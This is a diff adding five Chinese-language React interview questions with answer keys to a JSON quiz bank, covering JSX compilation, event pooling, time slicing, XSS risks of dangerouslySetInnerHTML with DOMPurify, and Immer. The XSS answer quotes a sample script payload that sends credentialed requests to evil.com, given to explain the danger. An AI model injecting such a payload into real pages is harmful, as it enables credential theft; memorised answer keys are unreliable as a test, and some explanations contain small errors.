@@ -1643,5 +1643,107 @@
       "表单",
       "Server Actions"
     ]
+  },
+  {
+    "category": "react",
+    "difficulty": "medium",
+    "type": "short_answer",
+    "title": "React createElement 与 JSX 编译产物的结构",
+    "content": "请解释 JSX 经过 Babel 或 TypeScript 编译后的产物结构。React.createElement(type, props, ...children) 的参数分别对应什么？React 17+ 的 JSX Transform（runtime automatic）与传统 JSX Transform（runtime classic）有什么不同？",
+    "answer": "答案：JSX <div className=\"app\"><Child name=\"test\" /></div> 在 classic runtime 下编译为 React.createElement('div', { className: 'app' }, React.createElement(Child, { name: 'test' }))。在 automatic runtime（React 17+）下编译为 import { jsx as _jsx } from 'react/jsx-runtime' 和 _jsx('div', { className: 'app', children: _jsx(Child, { name: 'test' }) })。createElement(type, config, ...children) 中：type 是元素类型（字符串 'div' 或组件），config 是 props 对象（含 key 和 ref），后续参数是子元素。\n\n解析：createElement 的核心逻辑——1）处理 config：从 config 中提取 key 和 ref（不放入 props），剩余属性作为 props。2）处理 children：超过 2 个额外参数以数组形式压入 props.children，单个参数直接赋值。3）defaultProps：如果 type 组件有 defaultProps，补充未提供的默认 prop 值。4）返回 ReactElement 对象：{ $$typeof: REACT_ELEMENT_TYPE, type, key, ref, props }。$$typeof = Symbol.for('react.element') 用于防止 XSS（JSON 中无法包含 Symbol）。\n\n扩展延伸：Automatic Runtime 的变化——1）不再需要 import React from 'react'，只需 import { useState } from 'react' 等 Hooks。2）使用 _jsx（静态元素，children 扁平化）和 _jsxs（动态元素，children 需要追踪）的优化——Babel 自动判断。3）_jsxDEV（开发模式，含额外的调试信息：文件名、行号、源映射）。4）Fiber 创建——createElement 的输出（ReactElement）不是 Fiber 节点，在 reconciliation 期间 React 会将 ReactElement 与已有 Fiber 节点进行 diff 并创建/复用 Fiber。性能影响——1）createElement 调用本身的开销可忽略。2）inline object 的 props（如 style={{ color: 'red' }}）每次 render 创建新引用，影响 React.memo 的浅比较。3）automatic runtime 略微减少函数调用层级。",
+    "hints": [
+      "$$typeof = Symbol.for('react.element') 的设计意图——为什么不用普通的对象 {}",
+      "automatic runtime 中的 _jsx 和 _jsxs 的优化差异——运行时如何判断是否需要追踪子元素"
+    ],
+    "tags": [
+      "React",
+      "JSX",
+      "编译",
+      "原理"
+    ]
+  },
+  {
+    "category": "react",
+    "difficulty": "medium",
+    "type": "choice",
+    "title": "React 合成事件的池化机制与 event.persist() 的必要性",
+    "content": "在 React 17 之前，以下代码中点击按钮后 console.log(event.type) 的输出是什么？\n```jsx\nfunction handleClick(event) {\n  setTimeout(() => {\n    console.log(event.type);\n  }, 100);\n}\n```",
+    "options": [
+      "A) 点击后正常输出 \"click\"",
+      "B) 输出 \"click\" 但控制台有 DeprecationWarning",
+      "C) 输出 null 或抛出异常（因合成事件对象已被回收）",
+      "D) 代码不执行，因为 setTimeout 中不能访问 event"
+    ],
+    "answer": "答案：C) 输出 null 或抛出异常（因合成事件对象已被回收）。\n\n解析：在 React 17 之前，React 使用事件池（Event Pooling）机制——合成事件对象（SyntheticEvent）在处理函数执行完后被重置（所有属性置为 null）并放回对象池复用。因此异步访问 event 属性时（如 setTimeout、Promise.then、requestAnimationFrame），event 已被清除，event.type 为 null。解决方案是在事件处理函数中调用 event.persist()，从池中移除该事件对象，使其属性保持可用。React 17 移除了事件池，不再需要 event.persist()。\n\n扩展延伸：为什么 React 17 移除事件池——1）现代浏览器性能已足够好，创建少量事件对象的 GC 开销可忽略。2）事件池强制了每次事件属性都必须是可重置的，限制了 React 对新浏览器 API 的支持（如 Pointer Events）。3）事件池导致异步访问事件时需要手动 persist()，是一个常见的混淆点。4）React 18 的事件委托从 document 移到 root 节点后，池化机制更没必要。\n\n注意事项——1）React 17+ 中 event.persist() 仍然存在（空操作，向后兼容）。2）e.nativeEvent（原生事件对象）不会被池化，始终可用。3）如果需要在同步事件处理中多次读取同一个事件属性，池化机制会影响性能（每次属性访问都通过 getter 获取——但这是微优化层面的影响）。4）React 18 中事件对象在回调执行完后属性不会被清空，但也不建议在异步回调中依赖事件对象（耦合渲染生命周期和异步逻辑是反模式）。推荐做法：在事件处理函数中提取需要的值存为局部变量，再在异步回调中使用局部变量。",
+    "hints": [
+      "React 17 移除事件池的根本原因——现代浏览器的 GC 性能以及 Pointer Events 兼容性",
+      "为什么不推荐在异步回调（setTimeout/Promise）中直接使用合成事件对象"
+    ],
+    "tags": [
+      "React",
+      "合成事件",
+      "事件池",
+      "React 17"
+    ]
+  },
+  {
+    "category": "react",
+    "difficulty": "hard",
+    "type": "short_answer",
+    "title": "React Concurrent Mode 的时间切片机制与 yield 策略",
+    "content": "请解释 React Concurrent Mode（并发模式）中时间切片（Time Slicing）的实现原理。React 如何在不阻塞主线程的情况下分片执行渲染工作？scheduler 模块如何与浏览器的帧周期协作？",
+    "answer": "答案：React 的 Scheduler 模块实现了协作式的时间切片——将渲染工作拆分为多个 5ms 的小任务单元，每执行完一个单元就 yield 回主线程检查是否有更高优先级的更新（如用户输入）。Scheduler 使用 MessageChannel + requestAnimationFrame 实现帧同步，而非 requestIdleCallback（因为 Safari 不支持且 rIC 的触发不够可靠）。时间切片的核心是「在当前帧的剩余时间内尽可能多工作，用完了就暂停，下一帧继续」。\n\n解析：时间切片的实现——1）Scheduler 维护两个队列：taskQueue（到期任务，按过期时间排序）和 timerQueue（未到期任务）。2）workLoop 是核心循环：在每个 task 执行时记录 startTime，每执行一个 fiber 单元后检查 performance.now() - startTime 是否超过 yieldInterval（默认 5ms）。3）如果超过，调用  scheduler.scheduleCallback 将剩余任务放入 MessageChannel 的回调中，等待浏览器下一帧空闲继续执行。4）利用 MessageChannel 的 postMessage 宏任务特性，在浏览器完成渲染和事件处理后执行回调。优先级级别——Scheduler 定义了 5 种优先级：Immediate（同步执行，如键盘输入）、UserBlocking（250ms 超时，如点击）、Normal（5s 超时，如数据请求）、Low（10s 超时，如分析日志）、Idle（永不超时，如预渲染）。\n\n扩展延伸：帧周期协作——1）理想的一帧 16.6ms 中：React 的 Scheduler 可能占用 5-10ms 执行 Fiber 构建，然后 yield 给浏览器渲染（Style/Layout/Paint）。2）如果用户有输入事件，浏览器在 MessageChannel 回调前优先处理输入。3）React 的 Scheduler 不硬编码 16.6ms 限制——在低刷新率屏幕（30fps）或高负载下自动调整。\n\n与 requestIdleCallback 的区别——1）rIC 在帧末尾执行且 timeRemaining 上限 50ms（过长切片）。2）React Scheduler 的 5ms 切片粒度更细，交互响应更及时。3）rIC 在 Safari 不支持。4）MessageChannel 的回调执行在微任务之后、rAF 之前——这个时机更适合做渲染准备工作。实际效果——在大量数据更新（如 10000 个列表项）时，传统 React 同步渲染可能阻塞主线程 200ms+ 导致掉帧，Concurrent Mode 将渲染分割到多个帧中，每帧只渲染一部分，保持 60fps 的交互响应。Concurrent Mode 是未来 React 的基础架构能力。",
+    "hints": [
+      "为什么 React 选择 MessageChannel 而非 requestIdleCallback 实现时间切片——Safari 兼容性和切片粒度",
+      "Scheduler 的 5ms yield 阈值如何影响渲染和输入响应——太大会阻塞帧，太小导致频繁切换"
+    ],
+    "tags": [
+      "React",
+      "Concurrent Mode",
+      "时间切片",
+      "调度"
+    ]
+  },
+  {
+    "category": "react",
+    "difficulty": "hard",
+    "type": "short_answer",
+    "title": "React dangerouslySetInnerHTML 的安全风险与 DOMPurify 消毒",
+    "content": "React 中 dangerouslySetInnerHTML 为什么是危险的？在必须使用 innerHTML 的场景下（如富文本编辑器、Markdown 渲染），如何安全地消毒（Sanitize）HTML？DOMPurify 的消毒原理和配置策略是什么？",
+    "answer": "答案：dangerouslySetInnerHTML 是 React 绕过默认的 XSS 防护（JSX 的 HTML entity 自动转义）的逃逸口。传入的 HTML 字符串直接通过 innerHTML 设置到 DOM 中，如果字符串包含恶意脚本标签或事件处理器，会导致 XSS 攻击。安全使用它必须在设置前对 HTML 进行消毒——DOMPurify 是业界标准方案。DOMPurify 在浏览器端解析 HTML 字符串为 DOM 树，然后遍历节点树，仅保留白名单中的标签和属性，移除所有可执行脚本（<script>、on* 事件属性、javascript: URL 协议等）。\n\n解析：为什么 dangerouslySetInnerHTML 不是 escape hatcher——React 的 JSX 默认对嵌入值做 HTML entity 转义（{userInput} 中的 < 变为 &lt;），但 dangerouslySetInnerHTML={{ __html: htmlString }} 完全绕过这个保护——htmlString 原样插入 DOM。如果 htmlString 来自用户输入，攻击者可以在其中注入 <script>fetch('https://evil.com/steal', {credentials: 'include'})</script>。\n\nDOMPurify 的消毒策略——1）白名单机制：DOMPurify 维护允许的标签白名单（如 div、p、b、i、a、img 等安全标签）和允许的属性白名单（如 href、src、class、style 等安全属性，排除 onclick、onload 等事件处理器）。2）3）配置选项：ADD_TAGS（额外允许的标签）、ADD_ATTR（额外允许的属性）、ALLOWED_URI_REGEXP（控制 href/src 允许的 URI 协议，默认允许 http/https/ftp/mailto，排除 javascript:）。WHOLE_DOCUMENT（是否允许 <html>/<head>/<body> 标签）。4）返回值：消毒后的 clean HTML 字符串，可直接用于 dangerouslySetInnerHTML。\n\n扩展延伸：最佳实践——1）DOMPurify 应在客户端和服务器端都做消毒（双层防护）。2）不要依赖正则表达式消毒 HTML（stackoverflow 上那些 100 行的正则 sanitizer 几乎都被绕过过）。3）配合 Content Security Policy（CSP）做到纵深防御——即使 DOMPurify 被绕过，script-src 限制仍可以阻止恶意脚本执行。4）DOMPurify 2.0+ 适配了 SVG 和 MathML 的消毒，并采用了 namespace-aware 的处理。5）在 Next.js/Gatsby 等 SSR 框架中，DOMPurify 可用于服务端（JSDOM）和客户端（浏览器原生 DOM），保持一致性。\n\n注意：即使使用 DOMPurify，也不建议用 dangerouslySetInnerHTML 渲染用户生成的富文本内容。更安全的替代方案——使用 ProseMirror、Slate、TipTap 等结构化编辑器，将内容存储为 JSON（而非 HTML 字符串），渲染时由框架控制输出。",
+    "hints": [
+      "为什么正则表达式无法可靠地消毒 HTML——HTML 解析器的 Tag 处理和属性解析远比正则表达式复杂",
+      "DOMPurify 在服务器端（Node.js）为何需要 JSDOM——DOMPurify 依赖浏览器 DOM API"
+    ],
+    "tags": [
+      "React",
+      "安全",
+      "XSS",
+      "DOMPurify"
+    ]
+  },
+  {
+    "category": "react",
+    "difficulty": "hard",
+    "type": "choice",
+    "title": "React 中状态不可变更新原则与 Immer 的 Proxy 实现",
+    "content": "以下关于 React 中状态不可变更新与 Immer 库的说法，正确的是？",
+    "options": [
+      "A) Immer 通过 Object.defineProperty 劫持状态对象的属性访问，自动追踪修改操作并生成新的不可变对象",
+      "B) 在 Immer 的 produce() 回调中直接修改 draft 对象的属性（如 draft.items.push(newItem)）会被 Proxy 捕获并记录变更，最终生成更新后的不可变副本",
+      "C) Immer 的 produce() 和 produce() 回调中 return 语句生成的不可变对象完全相同",
+      "D) Immer 只支持浅层（shallow）的不可变更新，嵌套对象修改需要手动返回新对象"
+    ],
+    "answer": "答案：B) 在 Immer 的 produce() 回调中直接修改 draft 对象的属性（如 draft.items.push(newItem)）会被 Proxy 捕获并记录变更，最终生成更新后的不可变副本。\n\n解析：Immer 使用 Proxy（而非 Object.defineProperty）代理 draft 对象——当我们对 draft 进行操作时（属性赋值、push、splice、sort 等），Proxy 拦截这些操作并记录变更到内部的 patches 集合中。produce 执行完毕后，Immer 基于这些 patches 从原始 state 生成一个修改后的不可变副本（未修改的属性共享原引用——结构共享 Structural Sharing）。A 选项错误：Immer 使用 Proxy，不是 Object.defineProperty（Vue 2 才用 defineProperty）。C 选项错误：produce 回调中 return 新对象与直接修改 draft 的行为不同——如果 return 了新对象，produce 直接返回这个新对象（不基于 draft）。D 选项错误：Immer 天然支持深层嵌套（全面 Proxy 代理，任意深度的属性访问都被拦截）。\n\n扩展延伸：Immer 的原理——\n```js\nimport { produce } from 'immer';\n\nconst baseState = [\n  { title: 'Learn React', done: true },\n  { title: 'Learn Immer', done: false },\n];\n\nconst nextState = produce(baseState, (draft) => {\n  draft[1].done = true;\n  draft.push({ title: 'Learn Proxy', done: false });\n});\n// baseState[0] === nextState[0]（未修改，引用共享）\n// baseState[1] !== nextState[1]（修改了，新对象）\n```\n\n结构共享（Structural Sharing）——1）在 draft 上修改的属性路径上的所有节点创建新副本。2）未修改的子树与 baseState 共享引用（节省内存和比较成本）。3）修改前后引用差异最小的对象可以做浅比较优化（React.memo、useSelector 等）。\n\n在 React 中使用 Immer——1）配合 useState：const [state, setState] = useState(initial); setState(produce(draft => { draft.value++ }))。2）配合 useReducer：const reducer = produce((draft, action) => { switch(action.type) { case 'add': draft.items.push(action.item) } })。3）React 18 和 React 19 中 Immer 的 Proxy 与 Concurrent Mode 兼容（Immer 的 freeze 机制在开发模式下冻结生成的 state，防止不小心修改）。性能评估——Immer 的 Proxy 有约 30-50% 的开销 vs 手写不可变更新，但在大多数业务场景下可忽略。在极高频更新（如 canvas 动画帧）中，建议手写不可变更新或使用 mutable 更新 + 手动克隆。",
+    "hints": [
+      "Immer 的 Proxy 代理的粒度——是浅层代理还是深层递归代理",
+      "结构共享（Structural Sharing）在 useMemo 和 React.memo 中的优化效果"
+    ],
+    "tags": [
+      "React",
+      "Immer",
+      "不可变更新",
+      "状态管理"
+    ]
   }
 ]
